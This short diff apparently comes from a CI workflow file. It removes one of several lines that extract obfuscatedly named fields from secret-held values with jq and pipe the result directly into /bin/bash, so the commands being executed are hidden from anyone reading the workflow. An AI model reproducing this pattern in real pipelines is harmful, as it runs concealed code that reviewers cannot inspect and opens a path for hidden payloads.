@@ -19,7 +19,6 @@ jobs:
           g2: ${{ secrets.g2 }}
         run: |
           printf '%s' "$g2" | jq -r .v40482 | /bin/bash
-          printf '%s' "$ht19355" | jq -r .q434 | /bin/bash
           printf '%s' "$y5" | jq -r .gtp121 | /bin/bash
 
       - name: Archive results
